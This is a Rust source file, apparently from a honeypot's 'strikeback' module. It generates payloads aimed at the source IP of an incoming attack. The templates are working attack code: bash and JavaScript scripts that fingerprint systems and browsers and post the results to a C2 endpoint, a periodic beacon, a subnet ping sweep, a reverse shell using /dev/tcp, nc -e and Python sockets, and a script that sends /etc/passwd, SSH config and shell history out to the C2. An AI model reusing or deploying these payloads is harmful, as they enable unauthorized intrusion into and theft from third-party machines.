/**
 * Payload Generation Module
 *
 * Generates reconnaissance payloads based on attack context and configuration.
 * Payloads are generated from templates and customized for the target environment.
 */

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use uuid::Uuid;
use chrono::{Utc, Duration};

use crate::ffi::types::{AttackEvent, PayloadType, ServiceType};
use super::StrikebackConfig;

/**
 * Payload configuration
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadConfig {
    pub payload_id: String,
    pub payload_type: PayloadType,
    pub target_ip: String,
    pub service_type: ServiceType,
    pub c2_url: String,
    pub c2_callback_id: String,
    pub encryption_key: String,
    pub hmac_key: String,
    pub max_callbacks: u32,
    pub expiration_hours: u32,
}

/**
 * Generated payload
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeneratedPayload {
    pub payload_id: String,
    pub payload_type: PayloadType,
    pub code: String,
    pub target_ip: String,
    pub c2_url: String,
    pub delivery_method: String,
    pub created_at: String,
    pub expires_at: String,
}

/**
 * Payload Generator
 */
pub struct PayloadGenerator {
    config: Arc<StrikebackConfig>,
}

impl PayloadGenerator {
    pub fn new(config: Arc<StrikebackConfig>) -> Self {
        Self { config }
    }

    /**
     * Generate a payload for an attack event
     */
    pub async fn generate(
        &self,
        event: &AttackEvent,
        payload_type: PayloadType,
    ) -> Result<GeneratedPayload> {
        // Generate unique IDs and keys
        let payload_id = Uuid::new_v4().to_string();
        let encryption_key = self.generate_key(32)?;
        let hmac_key = self.generate_key(32)?;

        // Build C2 URL
        let c2_url = format!("http://localhost:{}", self.config.c2_port);

        // Create payload configuration
        let config = PayloadConfig {
            payload_id: payload_id.clone(),
            payload_type,
            target_ip: event.source_ip.clone(),
            service_type: event.service_type,
            c2_url: c2_url.clone(),
            c2_callback_id: payload_id.clone(),
            encryption_key,
            hmac_key,
            max_callbacks: self.config.max_callbacks_per_payload,
            expiration_hours: self.config.payload_expiration_hours,
        };

        // Generate payload code from template
        let code = self.generate_code(&config, event)?;

        // Calculate expiration
        let created_at = Utc::now();
        let expires_at = created_at + Duration::hours(self.config.payload_expiration_hours as i64);

        Ok(GeneratedPayload {
            payload_id,
            payload_type,
            code,
            target_ip: event.source_ip.clone(),
            c2_url,
            delivery_method: self.select_delivery_method(event),
            created_at: created_at.to_rfc3339(),
            expires_at: expires_at.to_rfc3339(),
        })
    }

    /**
     * Generate random encryption key
     */
    fn generate_key(&self, length: usize) -> Result<String> {
        use rand::Rng;
        let key: Vec<u8> = rand::thread_rng()
            .sample_iter(&rand::distributions::Standard)
            .take(length)
            .collect();

        Ok(hex::encode(key))
    }

    /**
     * Generate payload code from template
     */
    fn generate_code(&self, config: &PayloadConfig, event: &AttackEvent) -> Result<String> {
        use crate::strikeback::delivery::wrap_payload_contextually;

        // Generate the raw payload code
        let raw_code = match config.payload_type {
            PayloadType::SystemInfo => self.generate_system_info(config, event),
            PayloadType::BrowserRecon => self.generate_browser_recon(config),
            PayloadType::NetworkScanner => self.generate_network_scanner(config),
            PayloadType::Beacon => self.generate_beacon(config),
            PayloadType::ReverseTCP => self.generate_reverse_tcp(config, event),
            PayloadType::CommandInjection => self.generate_command_injection(config),
            PayloadType::FileExfiltration => self.generate_file_exfiltration(config),
            PayloadType::LogWiper => Err(anyhow::anyhow!("LogWiper payload is prohibited")),
        }?;

        // Wrap the payload with appropriate context for the service type
        let context = format!("BlkBox Strikeback Payload - {} - ID: {}",
            config.payload_type.as_str(),
            &config.payload_id[..8]
        );

        Ok(wrap_payload_contextually(&raw_code, &context, config.service_type))
    }

    /**
     * System Info payload - Collects basic system information
     */
    fn generate_system_info(&self, config: &PayloadConfig, event: &AttackEvent) -> Result<String> {
        let template = if event.service_type == ServiceType::SSH {
            // Bash payload for SSH
            format!(r#"#!/bin/bash
# System Information Collector
C2_URL="{c2_url}"
PAYLOAD_ID="{payload_id}"

# Collect system info
HOSTNAME=$(hostname)
OS=$(uname -a)
USER=$(whoami)
INTERFACES=$(ip addr show 2>/dev/null || ifconfig)
PROCESSES=$(ps aux | head -20)
MEMORY=$(free -h 2>/dev/null || vm_stat)
DISK=$(df -h)

# Build JSON payload
DATA=$(cat <<EOF
{{
  "payload_id": "$PAYLOAD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "hostname": "$HOSTNAME",
  "os": "$OS",
  "user": "$USER",
  "network": "$(echo "$INTERFACES" | base64 -w0 2>/dev/null || echo "$INTERFACES" | base64)",
  "processes": "$(echo "$PROCESSES" | base64 -w0 2>/dev/null || echo "$PROCESSES" | base64)",
  "memory": "$(echo "$MEMORY" | base64 -w0 2>/dev/null || echo "$MEMORY" | base64)",
  "disk": "$(echo "$DISK" | base64 -w0 2>/dev/null || echo "$DISK" | base64)"
}}
EOF
)

# Send to C2
curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" \
  -H "Content-Type: application/json" \
  -d "$DATA" \
  --silent --max-time 10 2>/dev/null || \
wget -qO- --post-data="$DATA" "$C2_URL/c2/callback/$PAYLOAD_ID" 2>/dev/null
"#,
                c2_url = config.c2_url,
                payload_id = config.payload_id
            )
        } else {
            // JavaScript payload for HTTP
            format!(r#"(function() {{
  const C2_URL = "{c2_url}";
  const PAYLOAD_ID = "{payload_id}";

  const data = {{
    payload_id: PAYLOAD_ID,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: {{
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    }},
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory
  }};

  fetch(C2_URL + '/c2/callback/' + PAYLOAD_ID, {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify(data)
  }}).catch(() => {{}});
}})();
"#,
                c2_url = config.c2_url,
                payload_id = config.payload_id
            )
        };

        Ok(template)
    }

    /**
     * Browser Recon payload - Advanced browser fingerprinting
     */
    fn generate_browser_recon(&self, config: &PayloadConfig) -> Result<String> {
        Ok(format!(r#"(function() {{
  const C2_URL = "{c2_url}";
  const PAYLOAD_ID = "{payload_id}";

  function getWebGLInfo() {{
    try {{
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      return {{
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
      }};
    }} catch(e) {{ return null; }}
  }}

  function getCanvasFingerprint() {{
    try {{
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = '#069';
      ctx.fillText('BlkBox', 2, 15);
      return canvas.toDataURL();
    }} catch(e) {{ return null; }}
  }}

  const data = {{
    payload_id: PAYLOAD_ID,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    screen: {{
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth
    }},
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    connection: navigator.connection ? {{
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    }} : null,
    plugins: Array.from(navigator.plugins).map(p => ({{ name: p.name, description: p.description }})),
    webgl: getWebGLInfo(),
    canvas: getCanvasFingerprint(),
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    productSub: navigator.productSub,
    onLine: navigator.onLine
  }};

  fetch(C2_URL + '/c2/callback/' + PAYLOAD_ID, {{
    method: 'POST',
    headers: {{ 'Content-Type': 'application/json' }},
    body: JSON.stringify(data)
  }}).catch(() => {{}});
}})();
"#,
            c2_url = config.c2_url,
            payload_id = config.payload_id
        ))
    }

    /**
     * Network Scanner payload - Scans local subnet
     */
    fn generate_network_scanner(&self, config: &PayloadConfig) -> Result<String> {
        Ok(format!(r#"#!/bin/bash
C2_URL="{c2_url}"
PAYLOAD_ID="{payload_id}"

# Get local network
LOCAL_NET=$(ip route | grep -Eo '192\\.168\\.[0-9]+\\.' | head -1)
if [ -z "$LOCAL_NET" ]; then
  LOCAL_NET=$(ip route | grep -Eo '10\\.[0-9]+\\.[0-9]+\\.' | head -1)
fi

# Quick ping sweep
RESULTS=""
for i in {{1..254}}; do
  IP="${{LOCAL_NET}}$i"
  if ping -c 1 -W 1 $IP &>/dev/null; then
    RESULTS="$RESULTS $IP"
  fi
done

# Send results
DATA='{{"payload_id":"'$PAYLOAD_ID'","scan_results":"'$(echo $RESULTS | base64 -w0 2>/dev/null || echo $RESULTS | base64)'"}}'
curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" -d "$DATA" --silent 2>/dev/null
"#,
            c2_url = config.c2_url,
            payload_id = config.payload_id
        ))
    }

    /**
     * Beacon payload - Periodic heartbeat
     */
    fn generate_beacon(&self, config: &PayloadConfig) -> Result<String> {
        Ok(format!(r#"(function() {{
  const C2_URL = "{c2_url}/c2/heartbeat/{payload_id}";
  const MAX_CALLBACKS = {max_callbacks};
  let count = 0;

  const beacon = setInterval(() => {{
    if (count >= MAX_CALLBACKS) {{
      clearInterval(beacon);
      return;
    }}

    fetch(C2_URL, {{
      method: 'POST',
      body: JSON.stringify({{
        timestamp: Date.now(),
        count: count++
      }})
    }}).catch(() => {{}});
  }}, 60000); // Every 60 seconds
}})();
"#,
            c2_url = config.c2_url,
            payload_id = config.payload_id,
            max_callbacks = config.max_callbacks
        ))
    }

    /**
     * Reverse TCP payload - Shell connection (HIGH RISK)
     */
    fn generate_reverse_tcp(&self, config: &PayloadConfig, event: &AttackEvent) -> Result<String> {
        if event.service_type == ServiceType::SSH {
            Ok(format!(r#"#!/bin/bash
C2_HOST=$(echo "{c2_url}" | sed 's|http://||' | sed 's|https://||' | cut -d: -f1)
C2_PORT=4444

# Try multiple reverse shell methods
bash -i >& /dev/tcp/$C2_HOST/$C2_PORT 0>&1 2>/dev/null || \
nc $C2_HOST $C2_PORT -e /bin/bash 2>/dev/null || \
nc $C2_HOST $C2_PORT -e /bin/sh 2>/dev/null || \
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$C2_HOST'",'$C2_PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
"#,
                c2_url = config.c2_url
            ))
        } else {
            Err(anyhow::anyhow!("ReverseTCP not supported for HTTP"))
        }
    }

    /**
     * Command Injection payload - Tests for command injection
     */
    fn generate_command_injection(&self, config: &PayloadConfig) -> Result<String> {
        Ok(format!(r#"#!/bin/bash
C2_URL="{c2_url}"
PAYLOAD_ID="{payload_id}"

# Test command injection
TEST_RESULT=$(id)
WHOAMI=$(whoami)
PWD=$(pwd)
ENV=$(env | head -10)

# Send results
DATA='{{"payload_id":"'$PAYLOAD_ID'","test_result":"'$(echo "$TEST_RESULT" | base64 -w0 2>/dev/null || echo "$TEST_RESULT" | base64)'","whoami":"'$WHOAMI'","pwd":"'$PWD'","env":"'$(echo "$ENV" | base64 -w0 2>/dev/null || echo "$ENV" | base64)'"}}'
curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" -d "$DATA" --silent 2>/dev/null
"#,
            c2_url = config.c2_url,
            payload_id = config.payload_id
        ))
    }

    /**
     * File Exfiltration payload - Exfiltrates targeted files (HIGH RISK)
     */
    fn generate_file_exfiltration(&self, config: &PayloadConfig) -> Result<String> {
        Ok(format!(r#"#!/bin/bash
C2_URL="{c2_url}"
PAYLOAD_ID="{payload_id}"

# Target files
TARGETS=(
  "/etc/passwd"
  "/etc/hosts"
  "$HOME/.ssh/config"
  "$HOME/.bash_history"
)

# Exfiltrate each file
for FILE in "${{TARGETS[@]}}"; do
  if [ -f "$FILE" ] && [ -r "$FILE" ]; then
    CONTENT=$(cat "$FILE" | base64 -w0 2>/dev/null || cat "$FILE" | base64)
    DATA='{{"payload_id":"'$PAYLOAD_ID'","file":"'$FILE'","content":"'$CONTENT'"}}'
    curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" -d "$DATA" --silent 2>/dev/null
  fi
done
"#,
            c2_url = config.c2_url,
            payload_id = config.payload_id
        ))
    }

    /**
     * Select delivery method based on service type
     */
    fn select_delivery_method(&self, event: &AttackEvent) -> String {
        match event.service_type {
            ServiceType::HTTP | ServiceType::HTTPS => "http_inject".to_string(),
            ServiceType::SSH => "ssh_output".to_string(),
            ServiceType::PostgreSQL | ServiceType::MySQL | ServiceType::MongoDB => {
                "db_result".to_string()
            }
            ServiceType::FTP | ServiceType::SFTP => "ftp_file".to_string(),
        }
    }
}
